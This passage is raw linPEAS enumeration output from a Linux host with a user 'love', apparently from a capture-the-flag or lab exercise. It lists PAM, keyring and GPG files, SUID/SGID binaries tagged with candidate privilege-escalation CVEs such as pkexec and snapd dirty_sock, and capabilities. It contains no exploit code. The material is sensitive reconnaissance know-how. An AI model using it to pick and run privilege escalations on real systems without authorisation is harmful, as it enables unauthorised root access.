pam_nologin.so\rsession [success=ok ignore=ignore module_unknown=ignore default=bad] pam_selinux.so close\rsession required pam_loginuid.so\rsession optional pam_keyinit.so force revoke\rsession optional pam_motd.so motd=/run/motd.dynamic\rsession optional pam_motd.so noupdate\rsession optional pam_mail.so standard noenv # [1]\rsession required pam_limits.so\rsession required pam_env.so # [1]\rsession required pam_env.so user_readenv=1 envfile=/etc/default/locale\rsession [success=ok ignore=ignore module_unknown=ignore default=bad] pam_selinux.so open\r╔══════════╣ Passwords inside pam.d\r/etc/pam.d/lightdm:auth sufficient pam_succeed_if.so user ingroup nopasswdlogin ./linpeas.sh: 3672: ./linpeas.sh: [: not found\r╔══════════╣ Analyzing Cloud Init Files (limit 70)\r-rw-r--r-- 1 root root 3612 May 11 2019 /snap/core18/1066/etc/cloud/cloud.cfg lock_passwd: True\r-rw-r--r-- 1 root root 3612 Oct 4 2019 /snap/core18/1223/etc/cloud/cloud.cfg\rlock_passwd: True\r-rw-r--r-- 1 root root 3612 May 16 2019 /snap/core/7270/etc/cloud/cloud.cfg\rlock_passwd: True\r-rw-r--r-- 1 root root 3612 Aug 30 2019 /snap/core/7917/etc/cloud/cloud.cfg\rlock_passwd: True\r╔══════════╣ Analyzing Keyring Files (limit 70)\rdrwxrwxrwx 2 love love 4096 Jun 16 2022 /home/love/.local/share/keyrings drwxr-xr-x 2 root root 200 Jul 9 2019 /snap/core18/1066/usr/share/keyrings\rdrwxr-xr-x 2 root root 200 Oct 10 2019 /snap/core18/1223/usr/share/keyrings\rdrwxr-xr-x 2 root root 121 Jun 21 2019 /snap/core/7270/usr/share/keyrings\rdrwxr-xr-x 2 root root 121 Oct 1 2019 /snap/core/7917/usr/share/keyrings\rdrwxr-xr-x 3 root root 4096 Apr 8 2020 /usr/lib/python2.7/dist-packages/keyrings\rdrwxr-xr-x 3 root root 4096 Aug 6 2019 /usr/lib/python3/dist-packages/keyrings\rdrwxr-xr-x 2 root root 4096 Aug 6 2019 /usr/share/keyrings\r-rw------- 1 love love 105 Apr 9 2020 /home/love/.local/share/keyrings/login.keyring\r-rwxrwxrwx 1 love love 207 Oct 20 2019 /home/love/.local/share/keyrings/user.keystore\r╔══════════╣ Searching uncommon passwd files (splunk)\rpasswd file: /etc/pam.d/passwd passwd file: /etc/passwd\rpasswd file: /snap/core18/1066/etc/pam.d/passwd\rpasswd file: /snap/core18/1066/etc/passwd\rpasswd file: /snap/core18/1066/usr/share/lintian/overrides/passwd\rpasswd file: /snap/core18/1066/var/lib/extrausers/passwd\rpasswd file: /snap/core18/1223/etc/pam.d/passwd\rpasswd file: /snap/core18/1223/etc/passwd\rpasswd file: /snap/core18/1223/usr/share/lintian/overrides/passwd\rpasswd file: /snap/core18/1223/var/lib/extrausers/passwd\rpasswd file: /snap/core/7270/etc/pam.d/passwd\rpasswd file: /snap/core/7270/etc/passwd\rpasswd file: /snap/core/7270/usr/share/bash-completion/completions/passwd\rpasswd file: /snap/core/7270/var/lib/extrausers/passwd\rpasswd file: /snap/core/7917/etc/pam.d/passwd\rpasswd file: /snap/core/7917/etc/passwd\rpasswd file: /snap/core/7917/usr/share/bash-completion/completions/passwd\rpasswd file: /snap/core/7917/var/lib/extrausers/passwd\rpasswd file: /usr/share/bash-completion/completions/passwd\rpasswd file: /usr/share/lintian/overrides/passwd\r╔══════════╣ Analyzing PGP-GPG Files (limit 70)\r/usr/bin/gpg netpgpkeys Not Found\rnetpgp Not Found -rw-r--r-- 1 root root 360 Oct 20 2019 /etc/apt/trusted.gpg.d/ondrej_ubuntu_php.gpg\r-rw-r--r-- 1 root root 2796 Sep 18 2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg\r-rw-r--r-- 1 root root 2794 Sep 18 2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg\r-rw-r--r-- 1 root root 1733 Sep 18 2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg\r-rwxrwxrwx 1 love love 1200 Oct 20 2019 /home/love/.gnupg/trustdb.gpg\r-rw-r--r-- 1 root root 7399 Sep 18 2018 /snap/core18/1066/usr/share/keyrings/ubuntu-archive-keyring.gpg\r-rw-r--r-- 1 root root 6713 Oct 27 2016 /snap/core18/1066/usr/share/keyrings/ubuntu-archive-removed-keys.gpg\r-rw-r--r-- 1 root root 4097 Feb 6 2018 /snap/core18/1066/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg\r-rw-r--r-- 1 root root 0 Jan 17 2018 /snap/core18/1066/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg\r-rw-r--r-- 1 root root 1227 May 27 2010 /snap/core18/1066/usr/share/keyrings/ubuntu-master-keyring.gpg\r-rw-r--r-- 1 root root 7399 Sep 18 2018 /snap/core18/1223/usr/share/keyrings/ubuntu-archive-keyring.gpg\r-rw-r--r-- 1 root root 6713 Oct 27 2016 /snap/core18/1223/usr/share/keyrings/ubuntu-archive-removed-keys.gpg\r-rw-r--r-- 1 root root 4097 Feb 6 2018 /snap/core18/1223/usr/share/keyrings/ubuntu-cloudimage-keyring.gpg\r-rw-r--r-- 1 root root 0 Jan 17 2018 /snap/core18/1223/usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg\r-rw-r--r-- 1 root root 1227 May 27 2010 /snap/core18/1223/usr/share/keyrings/ubuntu-master-keyring.gpg\r-rw-r--r-- 1 root root 13395 Jun 21 2019 /snap/core/7270/etc/apt/trusted.gpg\r-rw-r--r-- 1 root root 12335 May 19 2012 /snap/core/7270/usr/share/keyrings/ubuntu-archive-keyring.gpg\r-rw-r--r-- 1 root root 0 May 19 2012 /snap/core/7270/usr/share/keyrings/ubuntu-archive-removed-keys.gpg\r-rw-r--r-- 1 root root 1227 May 19 2012 /snap/core/7270/usr/share/keyrings/ubuntu-master-keyring.gpg\r-rw-r--r-- 1 root root 13395 Oct 1 2019 /snap/core/7917/etc/apt/trusted.gpg\r-rw-r--r-- 1 root root 12335 May 19 2012 /snap/core/7917/usr/share/keyrings/ubuntu-archive-keyring.gpg\r-rw-r--r-- 1 root root 0 May 19 2012 /snap/core/7917/usr/share/keyrings/ubuntu-archive-removed-keys.gpg\r-rw-r--r-- 1 root root 1227 May 19 2012 /snap/core/7917/usr/share/keyrings/ubuntu-master-keyring.gpg\r-rw-r--r-- 1 root root 3267 Jan 10 2019 /usr/share/gnupg/distsigkey.gpg\r-rw-r--r-- 1 root root 7399 Sep 18 2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg\r-rw-r--r-- 1 root root 6713 Oct 27 2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg\r-rw-r--r-- 1 root root 4097 Feb 6 2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg\r-rw-r--r-- 1 root root 0 Jan 17 2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg\r-rw-r--r-- 1 root root 2253 Mar 21 2018 /usr/share/keyrings/ubuntu-esm-keyring.gpg\r-rw-r--r-- 1 root root 1139 Mar 21 2018 /usr/share/keyrings/ubuntu-fips-keyring.gpg\r-rw-r--r-- 1 root root 1139 Mar 21 2018 /usr/share/keyrings/ubuntu-fips-updates-keyring.gpg\r-rw-r--r-- 1 root root 1227 May 27 2010 /usr/share/keyrings/ubuntu-master-keyring.gpg\r-rw-r--r-- 1 root root 2867 Feb 22 2018 /usr/share/popularity-contest/debian-popcon.gpg\rdrwxrwxrwx 3 love love 4096 Oct 20 2019 /home/love/.gnupg\rdrwx------ 3 gdm gdm 4096 Oct 20 2019 /var/lib/gdm3/.gnupg\r╔══════════╣ Analyzing Postfix Files (limit 70)\r-rw-r--r-- 1 root root 694 May 18 2016 /snap/core/7270/usr/share/bash-completion/completions/postfix -rw-r--r-- 1 root root 694 May 18 2016 /snap/core/7917/usr/share/bash-completion/completions/postfix\r-rw-r--r-- 1 root root 675 Apr 2 2018 /usr/share/bash-completion/completions/postfix\r╔══════════╣ Analyzing FTP Files (limit 70)\r-rw-r--r-- 1 root root 69 Sep 2 2019 /etc/php/7.1/mods-available/ftp.ini\r-rw-r--r-- 1 root root 69 Mar 20 2020 /etc/php/7.4/mods-available/ftp.ini\r-rw-r--r-- 1 root root 69 Mar 20 2020 /usr/share/php7.1-common/common/ftp.ini\r-rw-r--r-- 1 root root 69 Mar 20 2020 /usr/share/php7.4-common/common/ftp.ini\r╔══════════╣ Analyzing Samba Files (limit 70)\r-rw-r--r-- 1 root root 188 Apr 1 2018 /usr/share/doc/nautilus-share/examples/smb.conf ╔══════════╣ Analyzing DNS Files (limit 70)\r-rw-r--r-- 1 root root 856 Apr 2 2018 /usr/share/bash-completion/completions/bind -rw-r--r-- 1 root root 856 Apr 2 2018 /usr/share/bash-completion/completions/bind\r╔══════════╣ Analyzing Interesting logs Files (limit 70)\r-rw-r----- 1 root adm 15213986 May 15 20:52 /var/log/apache2/access.log -rw-r----- 1 root adm 2321 May 15 20:50 /var/log/apache2/error.log\r-rw-r----- 1 mysql adm 0 May 15 19:21 /var/log/mysql/error.log\r╔══════════╣ Analyzing Windows Files (limit 70)\rlrwxrwxrwx 1 root root 22 Apr 2 2020 /etc/alternatives/my.cnf -\u0026gt; /etc/mysql/mariadb.cnf\rlrwxrwxrwx 1 root root 24 Apr 2 2020 /etc/mysql/my.cnf -\u0026gt; /etc/alternatives/my.cnf\r-rw-r--r-- 1 root root 83 Apr 2 2020 /var/lib/dpkg/alternatives/my.cnf\r-rw-r--r-- 1 root root 516413 Feb 10 2018 /usr/share/gutenprint/5.2/xml/printers.xml\r╔══════════╣ Analyzing Other Interesting Files (limit 70)\r-rw-r--r-- 1 root root 3771 Apr 5 2018 /etc/skel/.bashrc -rw-r--r-- 1 root root 3771 Apr 5 2018 /snap/core18/1066/etc/skel/.bashrc\r-rw-r--r-- 1 root root 3771 Apr 5 2018 /snap/core18/1223/etc/skel/.bashrc\r-rw-r--r-- 1 root root 3771 Sep 1 2015 /snap/core/7270/etc/skel/.bashrc\r-rw-r--r-- 1 root root 3771 Sep 1 2015 /snap/core/7917/etc/skel/.bashrc\r-rw-r--r-- 1 root root 807 Apr 5 2018 /etc/skel/.profile\r-rwxrwxrwx 1 love love 807 Oct 20 2019 /home/love/.profile\r-rw-r--r-- 1 root root 807 Apr 5 2018 /snap/core18/1066/etc/skel/.profile\r-rw-r--r-- 1 root root 807 Apr 5 2018 /snap/core18/1223/etc/skel/.profile\r-rw-r--r-- 1 root root 655 May 10 2019 /snap/core/7270/etc/skel/.profile\r-rw-r--r-- 1 root root 655 Jul 13 2019 /snap/core/7917/etc/skel/.profile\r-rwxrwxrwx 1 love love 0 Oct 20 2019 /home/love/.sudo_as_admin_successful\r╔════════════════════════════════════╗\r══════════════════════╣ Files with Interesting Permissions ╠══════════════════════ ╚════════════════════════════════════╝ ╔══════════╣ SUID - Check easy privesc, exploits and write perms\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid -rwsr-xr-x 1 root root 22K Jun 28 2019 /usr/bin/arping -rwsr-xr-x 1 root root 59K Mar 23 2019 /usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 22K Mar 27 2019 /usr/bin/pkexec ---\u0026gt; Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)\r-rwsr-xr-x 1 root root 19K Jun 28 2019 /usr/bin/traceroute6.iputils\r-rwsr-xr-x 1 root root 40K Mar 23 2019 /usr/bin/newgrp ---\u0026gt; HP-UX_10.20\r-rwsr-xr-x 1 root root 44K Mar 23 2019 /usr/bin/chsh\r-rwsr-xr-x 1 root root 75K Mar 23 2019 /usr/bin/chfn ---\u0026gt; SuSE_9.3/10\r-rwsr-xr-x 1 root root 75K Mar 23 2019 /usr/bin/gpasswd\r-rwsr-xr-x 1 root root 146K Jan 31 2020 /usr/bin/sudo ---\u0026gt; check_if_the_sudo_version_is_vulnerable\r-rwsr-xr-- 1 root dip 374K Feb 11 2020 /usr/sbin/pppd ---\u0026gt; Apple_Mac_OSX_10.4.8(05-2007)\r-rwsr-xr-x 1 root root 6.1M Nov 29 2017 /usr/local/Serv-U ---\u0026gt; FTP_Server\u0026lt;15.1.7(CVE-2019-12181)/Serv-U\r-rwsr-xr-x 1 root root 14K Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1\r-rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device\r-rwsr-xr-x 1 root root 427K Mar 4 2019 /usr/lib/openssh/ssh-keysign\r-rwsr-xr-- 1 root messagebus 42K Jun 10 2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\r-rwsr-sr-x 1 root root 10K Dec 18 2019 /usr/lib/xorg/Xorg.wrap\r-rwsr-xr-x 1 root root 31K Aug 11 2016 /bin/fusermount\r-rwsr-xr-x 1 root root 63K Jun 28 2019 /bin/ping\r-rwsr-xr-x 1 root root 27K Mar 5 2020 /bin/umount ---\u0026gt; BSD/Linux(08-1996)\r-rwsr-xr-x 1 root root 43K Mar 5 2020 /bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8\r-rwsr-xr-x 1 root root 44K Mar 23 2019 /bin/su\r-rwsr-xr-x 1 root root 40K Aug 23 2019 /snap/core/7917/bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 44K May 8 2014 /snap/core/7917/bin/ping\r-rwsr-xr-x 1 root root 44K May 8 2014 /snap/core/7917/bin/ping6\r-rwsr-xr-x 1 root root 40K Mar 25 2019 /snap/core/7917/bin/su\r-rwsr-xr-x 1 root root 27K Aug 23 2019 /snap/core/7917/bin/umount ---\u0026gt; BSD/Linux(08-1996)\r-rwsr-xr-x 1 root root 71K Mar 25 2019 /snap/core/7917/usr/bin/chfn ---\u0026gt; SuSE_9.3/10\r-rwsr-xr-x 1 root root 40K Mar 25 2019 /snap/core/7917/usr/bin/chsh\r-rwsr-xr-x 1 root root 74K Mar 25 2019 /snap/core/7917/usr/bin/gpasswd\r-rwsr-xr-x 1 root root 39K Mar 25 2019 /snap/core/7917/usr/bin/newgrp ---\u0026gt; HP-UX_10.20\r-rwsr-xr-x 1 root root 53K Mar 25 2019 /snap/core/7917/usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 134K Jun 11 2019 /snap/core/7917/usr/bin/sudo ---\u0026gt; check_if_the_sudo_version_is_vulnerable\r-rwsr-xr-- 1 root systemd-resolve 42K Jun 11 2019 /snap/core/7917/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r-rwsr-xr-x 1 root root 419K Mar 4 2019 /snap/core/7917/usr/lib/openssh/ssh-keysign\r-rwsr-sr-x 1 root root 105K Oct 1 2019 /snap/core/7917/usr/lib/snapd/snap-confine ---\u0026gt; Ubuntu_snapd\u0026lt;2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304) -rwsr-xr-- 1 root dip 386K Jun 12 2018 /snap/core/7917/usr/sbin/pppd ---\u0026gt; Apple_Mac_OSX_10.4.8(05-2007)\r-rwsr-xr-x 1 root root 40K May 16 2019 /snap/core/7270/bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 44K May 8 2014 /snap/core/7270/bin/ping\r-rwsr-xr-x 1 root root 44K May 8 2014 /snap/core/7270/bin/ping6\r-rwsr-xr-x 1 root root 40K Mar 25 2019 /snap/core/7270/bin/su\r-rwsr-xr-x 1 root root 27K May 16 2019 /snap/core/7270/bin/umount ---\u0026gt; BSD/Linux(08-1996)\r-rwsr-xr-x 1 root root 71K Mar 25 2019 /snap/core/7270/usr/bin/chfn ---\u0026gt; SuSE_9.3/10\r-rwsr-xr-x 1 root root 40K Mar 25 2019 /snap/core/7270/usr/bin/chsh\r-rwsr-xr-x 1 root root 74K Mar 25 2019 /snap/core/7270/usr/bin/gpasswd\r-rwsr-xr-x 1 root root 39K Mar 25 2019 /snap/core/7270/usr/bin/newgrp ---\u0026gt; HP-UX_10.20\r-rwsr-xr-x 1 root root 53K Mar 25 2019 /snap/core/7270/usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 134K Jun 11 2019 /snap/core/7270/usr/bin/sudo ---\u0026gt; check_if_the_sudo_version_is_vulnerable\r-rwsr-xr-- 1 root systemd-resolve 42K Jun 11 2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r-rwsr-xr-x 1 root root 419K Mar 4 2019 /snap/core/7270/usr/lib/openssh/ssh-keysign\r-rwsr-sr-x 1 root root 101K Jun 21 2019 /snap/core/7270/usr/lib/snapd/snap-confine ---\u0026gt; Ubuntu_snapd\u0026lt;2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304) -rwsr-xr-- 1 root dip 386K Jun 12 2018 /snap/core/7270/usr/sbin/pppd ---\u0026gt; Apple_Mac_OSX_10.4.8(05-2007)\r-rwsr-xr-x 1 root root 43K Oct 16 2018 /snap/core18/1066/bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 63K Mar 10 2017 /snap/core18/1066/bin/ping\r-rwsr-xr-x 1 root root 44K Mar 23 2019 /snap/core18/1066/bin/su\r-rwsr-xr-x 1 root root 27K Oct 16 2018 /snap/core18/1066/bin/umount ---\u0026gt; BSD/Linux(08-1996)\r-rwsr-xr-x 1 root root 75K Mar 23 2019 /snap/core18/1066/usr/bin/chfn ---\u0026gt; SuSE_9.3/10\r-rwsr-xr-x 1 root root 44K Mar 23 2019 /snap/core18/1066/usr/bin/chsh\r-rwsr-xr-x 1 root root 75K Mar 23 2019 /snap/core18/1066/usr/bin/gpasswd\r-rwsr-xr-x 1 root root 40K Mar 23 2019 /snap/core18/1066/usr/bin/newgrp ---\u0026gt; HP-UX_10.20\r-rwsr-xr-x 1 root root 59K Mar 23 2019 /snap/core18/1066/usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 146K Jan 18 2018 /snap/core18/1066/usr/bin/sudo ---\u0026gt; check_if_the_sudo_version_is_vulnerable\r-rwsr-xr-- 1 root systemd-resolve 42K Jun 10 2019 /snap/core18/1066/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r-rwsr-xr-x 1 root root 427K Mar 4 2019 /snap/core18/1066/usr/lib/openssh/ssh-keysign\r-rwsr-xr-x 1 root root 43K Aug 23 2019 /snap/core18/1223/bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 63K Jun 28 2019 /snap/core18/1223/bin/ping\r-rwsr-xr-x 1 root root 44K Mar 23 2019 /snap/core18/1223/bin/su\r-rwsr-xr-x 1 root root 27K Aug 23 2019 /snap/core18/1223/bin/umount ---\u0026gt; BSD/Linux(08-1996)\r-rwsr-xr-x 1 root root 75K Mar 23 2019 /snap/core18/1223/usr/bin/chfn ---\u0026gt; SuSE_9.3/10\r-rwsr-xr-x 1 root root 44K Mar 23 2019 /snap/core18/1223/usr/bin/chsh\r-rwsr-xr-x 1 root root 75K Mar 23 2019 /snap/core18/1223/usr/bin/gpasswd\r-rwsr-xr-x 1 root root 40K Mar 23 2019 /snap/core18/1223/usr/bin/newgrp ---\u0026gt; HP-UX_10.20\r-rwsr-xr-x 1 root root 59K Mar 23 2019 /snap/core18/1223/usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 146K Jan 18 2018 /snap/core18/1223/usr/bin/sudo ---\u0026gt; check_if_the_sudo_version_is_vulnerable\r-rwsr-xr-- 1 root systemd-resolve 42K Jun 10 2019 /snap/core18/1223/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r-rwsr-xr-x 1 root root 427K Mar 4 2019 /snap/core18/1223/usr/lib/openssh/ssh-keysign\r╔══════════╣ SGID\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid -rwxr-sr-x 1 root shadow 23K Mar 23 2019 /usr/bin/expiry -rwxr-sr-x 1 root tty 14K Jan 17 2018 /usr/bin/bsd-write\r-rwxr-sr-x 1 root ssh 355K Mar 4 2019 /usr/bin/ssh-agent\r-rwxr-sr-x 1 root mlocate 43K Mar 1 2018 /usr/bin/mlocate\r-rwxr-sr-x 1 root crontab 39K Nov 16 2017 /usr/bin/crontab\r-rwxr-sr-x 1 root shadow 71K Mar 23 2019 /usr/bin/chage\r-rwxr-sr-x 1 root tty 31K Mar 5 2020 /usr/bin/wall\r-rwxr-sr-x 1 root mail 14K May 28 2019 /usr/lib/evolution/camel-lock-helper-1.2\r-rwsr-sr-x 1 root root 10K Dec 18 2019 /usr/lib/xorg/Xorg.wrap\r-rwxr-sr-x 1 root shadow 34K Feb 27 2019 /sbin/pam_extrausers_chkpwd\r-rwxr-sr-x 1 root shadow 34K Feb 27 2019 /sbin/unix_chkpwd\r-rwxr-sr-x 1 root shadow 35K Apr 9 2018 /snap/core/7917/sbin/pam_extrausers_chkpwd\r-rwxr-sr-x 1 root shadow 35K Apr 9 2018 /snap/core/7917/sbin/unix_chkpwd\r-rwxr-sr-x 1 root shadow 61K Mar 25 2019 /snap/core/7917/usr/bin/chage\r-rwxr-sr-x 1 root systemd-network 36K Apr 6 2016 /snap/core/7917/usr/bin/crontab\r-rwxr-sr-x 1 root mail 15K Dec 7 2013 /snap/core/7917/usr/bin/dotlockfile\r-rwxr-sr-x 1 root shadow 23K Mar 25 2019 /snap/core/7917/usr/bin/expiry\r-rwxr-sr-x 3 root mail 15K Dec 4 2012 /snap/core/7917/usr/bin/mail-lock\r-rwxr-sr-x 3 root mail 15K Dec 4 2012 /snap/core/7917/usr/bin/mail-touchlock\r-rwxr-sr-x 3 root mail 15K Dec 4 2012 /snap/core/7917/usr/bin/mail-unlock\r-rwxr-sr-x 1 root crontab 351K Mar 4 2019 /snap/core/7917/usr/bin/ssh-agent\r-rwxr-sr-x 1 root tty 27K Aug 23 2019 /snap/core/7917/usr/bin/wall\r-rwsr-sr-x 1 root root 105K Oct 1 2019 /snap/core/7917/usr/lib/snapd/snap-confine ---\u0026gt; Ubuntu_snapd\u0026lt;2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304) -rwxr-sr-x 1 root shadow 35K Apr 9 2018 /snap/core/7270/sbin/pam_extrausers_chkpwd\r-rwxr-sr-x 1 root shadow 35K Apr 9 2018 /snap/core/7270/sbin/unix_chkpwd\r-rwxr-sr-x 1 root shadow 61K Mar 25 2019 /snap/core/7270/usr/bin/chage\r-rwxr-sr-x 1 root systemd-network 36K Apr 6 2016 /snap/core/7270/usr/bin/crontab\r-rwxr-sr-x 1 root mail 15K Dec 7 2013 /snap/core/7270/usr/bin/dotlockfile\r-rwxr-sr-x 1 root shadow 23K Mar 25 2019 /snap/core/7270/usr/bin/expiry\r-rwxr-sr-x 3 root mail 15K Dec 4 2012 /snap/core/7270/usr/bin/mail-lock\r-rwxr-sr-x 3 root mail 15K Dec 4 2012 /snap/core/7270/usr/bin/mail-touchlock\r-rwxr-sr-x 3 root mail 15K Dec 4 2012 /snap/core/7270/usr/bin/mail-unlock\r-rwxr-sr-x 1 root crontab 351K Mar 4 2019 /snap/core/7270/usr/bin/ssh-agent\r-rwxr-sr-x 1 root tty 27K May 16 2019 /snap/core/7270/usr/bin/wall\r-rwsr-sr-x 1 root root 101K Jun 21 2019 /snap/core/7270/usr/lib/snapd/snap-confine ---\u0026gt; Ubuntu_snapd\u0026lt;2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304) -rwxr-sr-x 1 root shadow 34K Feb 27 2019 /snap/core18/1066/sbin/pam_extrausers_chkpwd\r-rwxr-sr-x 1 root shadow 34K Feb 27 2019 /snap/core18/1066/sbin/unix_chkpwd\r-rwxr-sr-x 1 root shadow 71K Mar 23 2019 /snap/core18/1066/usr/bin/chage\r-rwxr-sr-x 1 root shadow 23K Mar 23 2019 /snap/core18/1066/usr/bin/expiry\r-rwxr-sr-x 1 root crontab 355K Mar 4 2019 /snap/core18/1066/usr/bin/ssh-agent\r-rwxr-sr-x 1 root tty 31K Oct 16 2018 /snap/core18/1066/usr/bin/wall\r-rwxr-sr-x 1 root shadow 34K Feb 27 2019 /snap/core18/1223/sbin/pam_extrausers_chkpwd\r-rwxr-sr-x 1 root shadow 34K Feb 27 2019 /snap/core18/1223/sbin/unix_chkpwd\r-rwxr-sr-x 1 root shadow 71K Mar 23 2019 /snap/core18/1223/usr/bin/chage\r-rwxr-sr-x 1 root shadow 23K Mar 23 2019 /snap/core18/1223/usr/bin/expiry\r-rwxr-sr-x 1 root crontab 355K Mar 4 2019 /snap/core18/1223/usr/bin/ssh-agent\r-rwxr-sr-x 1 root tty 31K Aug 23 2019 /snap/core18/1223/usr/bin/wall\r╔══════════╣ Checking misconfigurations of ld.so\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so /etc/ld.so.conf Content of /etc/ld.so.conf: include /etc/ld.so.conf.d/*.conf\r/etc/ld.so.conf.d\r/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf - /usr/lib/x86_64-linux-gnu/libfakeroot /etc/ld.so.conf.d/libc.conf\r- /usr/local/lib /etc/ld.so.conf.d/x86_64-linux-gnu.conf\r- /usr/local/lib/x86_64-linux-gnu - /lib/x86_64-linux-gnu\r- /usr/lib/x86_64-linux-gnu\r/etc/ld.so.preload\r╔══════════╣ Capabilities ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities ══╣ Current shell capabilities CapInh: 0x0000000000000000= CapPrm: 0x0000000000000000=\rCapEff: 0x0000000000000000=\rCapBnd: 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read\rCapAmb: 0x0000000000000000=\r══╣ Parent process capabilities\rCapInh: 0x0000000000000000= CapPrm: 0x0000000000000000=\rCapEff: 0x0000000000000000=\rCapBnd: 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read\rCapAmb: 0x0000000000000000=\rFiles with capabilities (limited to 50):\r/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep\r/usr/bin/mtr-packet = cap_net_raw+ep\r/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep\r╔══════════╣ Users with capabilities\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities ╔══════════╣ AppArmor binary profiles\r-rw-r--r-- 1 root root 3194 Mar 27 2018 sbin.dhclient -rw-r--r-- 1 root root 10625 Jun 19 2019 usr.bin.evince\r-rw-r--r-- 1 root root 8493 May 8 2020 usr.bin.firefox\r-rw-r--r-- 1 root root 2857 Apr 7 2018 usr.bin.man\r-rw-r--r-- 1 root root 23936 Oct 30 2019 usr.lib.snapd.snap-confine.real\r-rw-r--r-- 1 root root 540 Feb 26 2018 usr.sbin.cups-browsed\r-rw-r--r-- 1 root root 5552 May 30 2019 usr.sbin.cupsd\r-rw-r--r-- 1 root root 643 Jan 17 2018 usr.sbin.ippusbxd\r-rw-r--r-- 1 root root 730 Jan 30 2020 usr.sbin.mysqld\r-rw-r--r-- 1 root root 1550 Apr 24 2018 usr.sbin.rsyslogd\r-rw-r--r-- 1 root root 1353 Apr 1 2018 usr.sbin.tcpdump\r╔══════════╣ Files with ACLs (limited to 50)\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls files with acls in searched folders Not Found ╔══════════╣ Files (scripts) in /etc/profile.d/\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files total 44 drwxr-xr-x 2 root root 4096 Apr 2 2020 .\rdrwxr-xr-x 130 root root 12288 Jun 16 2022 ..\r-rw-r--r-- 1 root root 96 Aug 20 